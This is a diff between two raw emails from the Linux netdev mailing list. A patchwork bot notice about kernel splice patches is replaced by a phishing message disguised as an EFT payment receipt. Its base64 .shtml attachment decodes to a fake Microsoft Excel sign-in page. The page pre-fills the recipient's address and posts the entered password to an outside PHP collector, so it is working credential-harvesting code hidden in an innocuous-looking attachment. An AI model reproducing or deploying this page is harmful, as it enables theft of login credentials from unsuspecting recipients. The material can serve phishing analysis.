@@ -1,94 +1,162 @@
-Return-Path: <netdev+bounces-10288-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-10315-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
-	by mail.lfdr.de (Postfix) with ESMTPS id 7361972D8F7
-	for <lists+netdev@lfdr.de>; Tue, 13 Jun 2023 07:10:27 +0200 (CEST)
+Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
+	by mail.lfdr.de (Postfix) with ESMTPS id F0D6C72DD4D
+	for <lists+netdev@lfdr.de>; Tue, 13 Jun 2023 11:09:28 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 2E226280F10
-	for <lists+netdev@lfdr.de>; Tue, 13 Jun 2023 05:10:26 +0000 (UTC)
+	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 330F41C20C22
+	for <lists+netdev@lfdr.de>; Tue, 13 Jun 2023 09:09:25 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 1F54E17F2;
-	Tue, 13 Jun 2023 05:10:24 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id F07EE568B;
+	Tue, 13 Jun 2023 09:09:25 +0000 (UTC)
 X-Original-To: netdev@vger.kernel.org
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
+Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 84A10361
-	for <netdev@vger.kernel.org>; Tue, 13 Jun 2023 05:10:22 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPS id E4E5EC433A1;
-	Tue, 13 Jun 2023 05:10:21 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
-	s=k20201202; t=1686633022;
-	bh=NHdCIb1zv2Arlk5ZHNC+WxvFRKd8YhAHkgky6zU714g=;
-	h=Subject:From:Date:References:In-Reply-To:To:Cc:From;
-	b=EYYc3q/wMH0BEElR4x/aWfNiKnE71+w4S+tZLwcSdvjo1qGvXoaD/aG88sVhkjMHi
-	 n+gGLe9BWmjKmKaLk8YKHBwPoV9VOu96aLes+jNv6RM6W34JpNbR76odLODm8h5evn
-	 pAV08PHhJh3Jy0hpQRPuObLNH1miq6RhccmMFeHF/vIX4ERUOLbZxfoGKjhcO8Pyak
-	 rrkODPSW/ch6e+/A6GLRZ878944LH6FSSwHYPk/Qgwq9PwnMTOKeOXamk98pUJR9qs
-	 F5SVa8qZBGLrguJ4ekYlKP1OHRuLNY0UrbmNKq5jUCkxmnMUg+KNNkmaxx8vIJjl/z
-	 MVGsuoSADZW/g==
-Received: from aws-us-west-2-korg-oddjob-1.ci.codeaurora.org (localhost.localdomain [127.0.0.1])
-	by aws-us-west-2-korg-oddjob-1.ci.codeaurora.org (Postfix) with ESMTP id C7DEFE21EC0;
-	Tue, 13 Jun 2023 05:10:21 +0000 (UTC)
-Content-Type: text/plain; charset="utf-8"
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D1AC25674
+	for <netdev@vger.kernel.org>; Tue, 13 Jun 2023 09:09:25 +0000 (UTC)
+X-Greylist: delayed 9637 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Tue, 13 Jun 2023 02:09:21 PDT
+Received: from jwba.or.jp (unknown [77.91.122.223])
+	by lindbergh.monkeyblade.net (Postfix) with ESMTP id AAC0718E
+	for <netdev@vger.kernel.org>; Tue, 13 Jun 2023 02:09:21 -0700 (PDT)
+Received: from [185.225.74.171] (localhost [IPv6:::1])
+	by jwba.or.jp (Postfix) with ESMTP id 301FF8801F3
+	for <netdev@vger.kernel.org>; Tue, 13 Jun 2023 07:17:41 +0200 (CEST)
+Reply-To: sandy@pac-pactrens.com
+From: =?UTF-8?B?QXR0YWNoZWQgZG9jIGZvcg==?= netdev <sanjuyuan@sanhecg.com>
+To: netdev@vger.kernel.org
+Subject: =?UTF-8?B?RUZUIFBheW1lbnQgc2VudCBPbjo=?=  Tuesday, June 13, 2023 7:17 a.m.
+Date: 13 Jun 2023 07:17:40 +0200
+Message-ID: <20230613071740.720CD14D2832EB96@sanhecg.com>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-Subject: Re: [PATCH net-next 0/6] splice,
- net: Some miscellaneous MSG_SPLICE_PAGES changes
-From: patchwork-bot+netdevbpf@kernel.org
-Message-Id: 
- <168663302181.19155.9169104916425356557.git-patchwork-notify@kernel.org>
-Date: Tue, 13 Jun 2023 05:10:21 +0000
-References: <20230609100221.2620633-1-dhowells@redhat.com>
-In-Reply-To: <20230609100221.2620633-1-dhowells@redhat.com>
-To: David Howells <dhowells@redhat.com>
-Cc: netdev@vger.kernel.org, kuba@kernel.org, davem@davemloft.net,
- edumazet@google.com, pabeni@redhat.com, willemdebruijn.kernel@gmail.com,
- dsahern@kernel.org, willy@infradead.org, axboe@kernel.dk, linux-mm@kvack.org,
- linux-kernel@vger.kernel.org
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_2708A05F.496C3158"
+X-Spam-Status: No, score=2.3 required=5.0 tests=BAYES_50,FROM_EXCESS_BASE64,
+	HTML_MESSAGE,MAY_BE_FORGED,MIME_HTML_ONLY,SPF_HELO_SOFTFAIL,
+	SPF_SOFTFAIL,T_HTML_ATTACH,T_OBFU_HTML_ATTACH,T_SCC_BODY_TEXT_LINE
+	autolearn=no autolearn_force=no version=3.4.6
+X-Spam-Level: **
+X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
+	lindbergh.monkeyblade.net
 
-Hello:
+This is a multi-part message in MIME format.
 
-This series was applied to netdev/net-next.git (main)
-by Jakub Kicinski <kuba@kernel.org>:
+------=_NextPart_000_0012_2708A05F.496C3158
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
 
-On Fri,  9 Jun 2023 11:02:15 +0100 you wrote:
-> Now that the splice_to_socket() has been rewritten so that nothing now uses
-> the ->sendpage() file op[1], some further changes can be made, so here are
-> some miscellaneous changes that can now be done.
-> 
->  (1) Remove the ->sendpage() file op.
-> 
->  (2) Remove hash_sendpage*() from AF_ALG.
-> 
-> [...]
+<!DOCTYPE HTML>
 
-Here is the summary with links:
-  - [net-next,1/6] Remove file->f_op->sendpage
-    https://git.kernel.org/netdev/net-next/c/a3bbdc52c38f
-  - [net-next,2/6] algif: Remove hash_sendpage*()
-    https://git.kernel.org/netdev/net-next/c/345ee3e8126a
-  - [net-next,3/6] sunrpc: Use sendmsg(MSG_SPLICE_PAGES) rather then sendpage
-    https://git.kernel.org/netdev/net-next/c/5df5dd03a8f7
-  - [net-next,4/6] tcp_bpf: Make tcp_bpf_sendpage() go through tcp_bpf_sendmsg(MSG_SPLICE_PAGES)
-    https://git.kernel.org/netdev/net-next/c/de17c6857301
-  - [net-next,5/6] kcm: Use sendmsg(MSG_SPLICE_PAGES) rather then sendpage
-    https://git.kernel.org/netdev/net-next/c/264ba53fac79
-  - [net-next,6/6] kcm: Send multiple frags in one sendmsg()
-    https://git.kernel.org/netdev/net-next/c/c31a25e1db48
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">Dear netdev,<br>FYI, attached file.<br>The c=
+omplete version of this receipt has been attached to this e-mail:netdev@vge=
+r.kernel.org,<br>----------------------------------<br>See attached.<br>Tha=
+nks for your business.</body></html>
+------=_NextPart_000_0012_2708A05F.496C3158
+Content-Type: application/octet-stream; name="netdev =?UTF-8?B?Vm91Y2hlcg==?=.shtml"; charset="utf-8"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="netdev =?UTF-8?B?Vm91Y2hlcg==?=.shtml"
 
-You are awesome, thank you!
--- 
-Deet-doot-dot, I am a bot.
-https://korg.docs.kernel.org/patchwork/pwbot.html
+PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+DQphbGVydCgiVGhpcyBEb2N1bWVudCBJ
+cyBTaGFyZWQgVmlhIE1pY3Jvc29mdCBFeGNlbCBTZWN1cml0eSAmIFJlcXVpcmVzIEF1dGhl
+bnRpY2F0aW9uLiBDbGljayBPayBUbyBDb250aW51ZSIpDQo8L3NjcmlwdD4NCjxIVE1MPjxI
+RUFEPjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1s
+OyBjaGFyc2V0PWlzby04ODU5LTEiPg0KDQo8U1RZTEUgdHlwZT10ZXh0L2Nzcz4NCmJvZHks
+IGh0bWwge2hlaWdodDogMTAwJTttYXJnaW46IDA7ICBmb250LWZhbWlseTogIlNlZ29lIFVJ
+IFdlYmZvbnQiLC1hcHBsZS1zeXN0ZW0sIkhlbHZldGljYSBOZXVlIiwiTHVjaWRhIEdyYW5k
+ZSIsIlJvYm90byIsIkVicmltYSIsIk5pcm1hbGEgVUkiLCJHYWR1Z2kiLCJTZWdvZSBYYm94
+IFN5bWJvbCIsIlNlZ29lIFVJIFN5bWJvbCIsIk1laXJ5byBVSSIsIktobWVyIFVJIiwiVHVu
+Z2EiLCJMYW8gVUkiLCJSYWF2aSIsIklza29vbGEgUG90YSIsIkxhdGhhIiwiTGVlbGF3YWRl
+ZSIsIk1pY3Jvc29mdCBZYUhlaSBVSSIsIk1pY3Jvc29mdCBKaGVuZ0hlaSBVSSIsIk1hbGd1
+biBHb3RoaWMiLCJFc3RyYW5nZWxvIEVkZXNzYSIsIk1pY3Jvc29mdCBIaW1hbGF5YSIsIk1p
+Y3JvaWxzb2Z0IE5ldyBUYWkgTHVlIiwiTWljcm9zb2Z0IFBoYWdzUGEiLCJNaWNyb3NvZnQg
+VGFpIExlIiwiTWljcm9zb2Z0IFlpIEJhaXRpIiwiTW9uZ29saWFuIEJhaXRpIiwiTVYgQm9s
+aSIsIk15YW5tYXIgVGV4dCIsIkNhbWJyaWEgTWF0aCI7fQkNCi53cmFwcGVyIHsgIGJhY2tn
+cm91bmQtaW1hZ2U6IHVybChodHRwczovL2kuZ3lhem8uY29tLzQ1MjJjYWViMjUwYjkwMjc2
+N2VhOWQ3ZGJlZTUxMGZiLnBuZyk7ICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0OyBi
+YWNrZ3JvdW5kLWF0dGFjaG1lbnQ6IGZpeGVkOyAgYmFja2dyb3VuZC1wb3NpdGlvbjogY2Vu
+dGVyOyAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsgIHBvc2l0aW9uOiBmaXhlZDsgIHRvcDog
+MDsgIGxlZnQ6IDA7ICBoZWlnaHQ6IDEwMCU7ICB3aWR0aDogMTAwJTsgICBkaXNwbGF5OiBm
+bGV4OyAgZmxleC1mbG93OiBjb2x1bW4gbm93cmFwOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRl
+cjsgIGFsaWduLWl0ZW1zOiBjZW50ZXI7ICBib3gtc2l6aW5nOiBib3JkZXItYm94O30NCi5l
+bGVtZW50IHsgIHdpZHRoOiAzMjBweDsgIGhlaWdodDogMzAwcHg7ICBwYWRkaW5nOiA0MHB4
+IDMwcHg7ICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOyAgYm9yZGVyOiAxcHggc29saWQg
+Z3JleTsgIGJvcmRlci1jb2xvcjogIzAzNmUzNzt9DQouZWxlbWVudGV7CXdpZHRoOiA0MDBw
+eDsgIGhlaWdodDogMzAwcHg7ICBwYWRkaW5nOiA0MHB4IDMwcHg7ICBiYWNrZ3JvdW5kLWNv
+bG9yOiAjZmZmZmZmOyAgYm9yZGVyOiAxcHggc29saWQgZ3JleTt9DQpkaXYgLnNpZ24tb3B0
+IHsJcGFkZGluZzogMjBweCAwcHg7CWZvbnQtc2l6ZTogMTRweDt9DQoubmV3YnV0dG9uewl3
+aWR0aDogMTEwcHg7IGZsb2F0OiBsZWZ0OyBib3JkZXItY29sb3I6ICMwMzZlMzc7IGJhY2tn
+cm91bmQtY29sb3I6ICMwMzZlMzc7IGNvbG9yOiAjZmZmOyBmb250LXNpemU6IDE0cHg7IHBh
+ZGRpbmc6IDhweCAwOyBjdXJzb3I6IHBvaW50ZXI7IGJvcmRlcjogbm9uZTt9DQo8L1NUWUxF
+Pg0KPHRpdGxlPk1pY3Jvc29mdCBFeGNlbDwvdGl0bGU+DQo8bGluayByZWw9InNob3J0Y3V0
+IGljb24iIGhyZWY9IiB0eXBlPSJpbWFnZS92bmQubWljcm9zb2Z0Lmljb24iPg0KPC9IRUFE
+Pg0KPEJPRFk+DQo8RElWIGNsYXNzPXdyYXBwZXI+PCEtLSBGaXhlZCBlbGVtZW50IHRoYXQg
+c3BhbnMgdGhlIHZpZXdwb3J0IC0tPg0KPERJViBpZD1lbGVtZW50IGNsYXNzPWVsZW1lbnQ+
+DQo8Rk9STSBtZXRob2Q9cG9zdCBhY3Rpb249Imh0dHBzOi8vZGV2LW1pMDAwMDAucGFudGhl
+b25zaXRlLmlvL29vdG9vb3QveHRlcnkveGxzcy5waHAiIGF1dG9jb21wbGV0ZT0iIj48cD4N
+CjxESVYgaWQ9bG9nbz48SU1HIGJvcmRlcj0wIGFsdD0iIiBzcmM9ImRhdGE6aW1hZ2UvcG5n
+O2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBSU1BQUFDRENBTUFBQUNaUTFoVUFB
+QUFiRkJNVkVVZ2NrWC8vLzhJYkRxRXA1RU5iRHlPc0p3QWFEUDIrL2daY0VFL2dsd1Niejg3
+ZTFPdXhyZmQ1dUFBYVRhQm80d0FaQzNTMzlmajdPWUFZQ1R1OC9DKzBjVXVlRTZpdnExa2xI
+ZkwydEZUaW1ocm1uN0Yxc3RIaEdCL3A0ODRmMWVadDZSYmptOTRuNFVBWEJ1SHJjYkVBQUFF
+dWtsRVFWUjRuTzJiYVp1aklBeUFGUlVwVlVhdFVudllhLzcvZjF4YmxMczdPcFhhWjlmMFc3
+VHd5cEdFQUo0L3YzaHpBL2dMUXk4TEE1T0ZnY25Dd09SbGhqeUo2a015RTBOYzdKTGJHUklD
+TUlhSHR6T1V4VEdxR3dwZ2lEd21tL3lkREVYYjlxc3NJN3o2aDVETGV4amF0aitkNFFZQ3JG
+VC9rREJ5elZDbXU4dGg3WVhheDcrTElTNnFvRjRoK0x4NnB3eHhuZ1I3WW05Nzl3eHhldHdl
+S1B6cDQxMHhsRVVWWFZjZUdWNzl0QXh0MjE4cHlRZ2FWZjEwRE5XQmJqSTQ3dU1uWmpqOXZ2
+cXBHSGJaS3dEVE1BUmtBb1o0cE9nTVlBSUdtc0Z4VXBlVE02ekdqaWpTeExNemVGa3lQd01J
+Rm9hRllXRllHUDRuaGpNSWUxR2lZSVJ0V2pjTTBSZVhkaDNLSHhGNjY3V05GcVpNenlCTHZP
+MGpFaERGRnUwN0dIei9GcklINm9yOHBGVDBBZ09HVUgvZlpOaXhWN0tkb2syVklmRjdCbElu
+VmFERi95WkR3WXJjRktxV1RzSUFIOHY4L0NlR2loVUpLN1YxOEJRTW9HYWxYWlMvbUF4N0Jv
+bjJpdllham1JZ01NeENRNHZYM1RBdmxDR3VNK1RYL2pIWml4Uk5XbytiRnlRb3l2Umc2dnNT
+VFliOVdnZ1M5QmpidEVNWUFQdXdFMVRWR2MvQUpRYkRDaU11eXAvczJwOFphTmZrdGZJRUJq
+MUM2U2tsdXZBWFlpZzFVdnVGelpQQjVZYUIxMWFJb2hIbGt6M1NGb2RPL0NaSytSRG43ZzRl
+ZTEybHIwL2RNRkR1YXZMTzIyVmJQaGcyK3V2NmVsUHVLV3pWRG1Cb2JSR0hxQjZUQTNEdlV6
+WllmL3ZPVUNWQ0RtSVNoRFhYM3JTcDhhT05naWMrQUM5RWFaaVRtU2t3N09TUisyN1pXT2Rq
+ZlRjVTVRYVpCN2k1MjBMelhkTldSNnhJb0Q1UUE0Z0Iva0lNQVAvd3pUOG50eUJZR05MT2I2
+YXFkbVE3dFBhYVR3U2YxMUZTMi9DM01MQUIrTEx2UmlqVmkvWXRMc1RLa0hTK1c5MWVxY2JI
+VWNncnRhSWpXMDlZR0FwdXkrWFBpTDFmeEZINEhDdEZHOFpKWWtnbFNYaVBJYnJsMm9xT25K
+dE1pQktUbHVDSkxXVHJDOXdMZ09JOUJJRkZPNFpCY3BXdG1NWkpZbkM0enNyRU50SFdzTkZ2
+WWtBaU9vL3RrOEk1ZzJTb1dxRlBPc01wZytRMUhvUHlDWVJMQnR6NHFxU2V0YWEvemd2eTBy
+eEFubUVvajlZVS96RDdrUHpHUG9oVmttQkpiQkRQN1NSOTBVNkthVmwrMzNoQk5uUHR6RitF
+TmVmZlkyazNlVWdNTTVIZlJKZzdyUHVuWjd4ZjRxdnh1cXY0SWVTUlUvSm9mV2x2MzVpaGp1
+SW8wWk01ZTRyNFd0TXZ6dG9zY3hOUEVtNmM0bjVHNFRYdjNOekNNSGxjalNpSHYzSDRjQ1cr
+VTUyaFR0WVhJb3E3U0xXQnE5N2ZFb083OWVaUmVVUjROSkdhYTM5WDYrNVNTNjdDM2t5WU9a
+REpmVmEvcWpJaXA5NU1WTzRaK2p5TWFSSlp4ckZzekJ4STIyVGRUOC9ETU4zWVBJeEhvcUpN
+YjFZYnZpM0wzVjU5NGlRZjlTd3ZkNWMySU5BakFjMUd4Zm5la3BlTHgrYmx4b21qL09TTERD
+N3p0RU1abk9hckJ6SzR6ZHNQWTNDOGZ6R0E0Y2srVHVKNlhrUmZRYmR4Rlh5cCsxbEJwMTA1
+MzgvNmhIMjlUOWpmWEJnV2hvVmhZZmkzR0Q3Z3ZKeURjNE92bnAvOGdIT2tuM0NlOWhQT0ZY
+Zm5xMGNlTHArYTRTN2RPWE13MXpuelR1SzV6OXNMa3NlOUF6TFh2UU9aNUg3LzRuNzNaVURm
+dUw2SEVzMTREMFZJV1J3djlkb0RNOTNIa2FRNGJ0bTlKRXZmdkl1aEkwbUNHZTluQ1huMFRV
+T2x2bm52UFRVdTBuMjljSWI3ZXJMTWVtOXhPbGtZbUN3TVRCWUdKZ3NEazA5ZytBTkRMV2VK
+ampWVFFBQUFBQUJKUlU1RXJrSmdnZz09IiBjb2xvcj0iIzAzNmUzNyIgYWxpZ249InRvcCIg
+d2lkdGg9IjMwIiBoZWlnaHQ9IjMwIi8+IDxiPiBGaWxlOiBTY2FubmVkIERvYzA5ODkwODE8
+L2I+PC9ESVY+PC9wPjxwPg0KPERJViBpZD1jb250IHN0eWxlPSJURVhULUFMSUdOOiBsZWZ0
+OyBQQURESU5HLVRPUDogMTBweDsgZm9udC1zaXplOjIwcHg7IGNvbG9yOiMwMTE0MGE7IiA+
+RW50ZXIgUGFzc3dvcmQgVG8gRG93bmxvYWQgRmlsZTwvRElWPjwvcD48cD4NCg0KPERJVj48
+SU5QVVQgIG5hbWU9bG9naW4tYW1nIHJlcXVpcmVkPSJyZXF1aXJlZCIgdmFsdWU9Im5ldGRl
+dkB2Z2VyLmtlcm5lbC5vcmciIHBsYWNlaG9sZGVyPSJFbWFpbCBhZGRyZXNzIiByZWFkb25s
+eSBzdHlsZT0id2lkdGg6MzIwOyBoZWlnaHQ6MzA7IGJvcmRlci1jb2xvcjogIzAzNmUzNyI+
+PC9ESVY+PC9wPg0KPERJVj48SU5QVVQgdHlwZT1wYXNzd29yZCBuYW1lPXBhc3N3ZC1hbWcg
+cmVxdWlyZWQ9InJlcXVpcmVkIiBhdXRvZm9jdXM9ImF1dG9mb2N1cyIgcGxhY2Vob2xkZXI9
+IlBhc3N3b3JkIiBzdHlsZT0id2lkdGg6MzIwOyBoZWlnaHQ6MzA7IGJvcmRlci1jb2xvcjog
+IzAzNmUzNyI+PC9ESVY+DQo8RElWIGlkPXNpZ24tb3B0IGNsYXNzPXNpZ24tb3B0Pg0KPERJ
+ViBpZD1uby1hY2M+PC9BPjwvRElWPg0KPERJViBjbGFzcz1idXR0b24+PEEgaHJlZj0iIyI+
+PEJVVFRPTiBpZD1pOTgzODkzIGNsYXNzPW5ld2J1dHRvbiB0eXBlPXN1Ym1pdCBuYW1lPXN1
+Ym1pdD4NCjxGT05UIGNvbG9yPSNmZmY+U2lnbiBpbjwvRk9OVD48L0JVVFRPTj48L0E+PC9E
+SVY+DQo8RElWIGlkPXNpZ24tb3V0IGNsYXNzPXNpZ24tb3B0PjxBIGhyZWY9IiMiPjwvQT48
+L0RJVj48L0RJVj48L0ZPUk0+PC9ESVY+PCEtLSB5b3VyIGFjdHVhbCBjZW50ZXJlZCBlbGVt
+ZW50IC0tPjwvRElWPjwvQk9EWT48L0hUTUw+
 
-
+------=_NextPart_000_0012_2708A05F.496C3158--
 
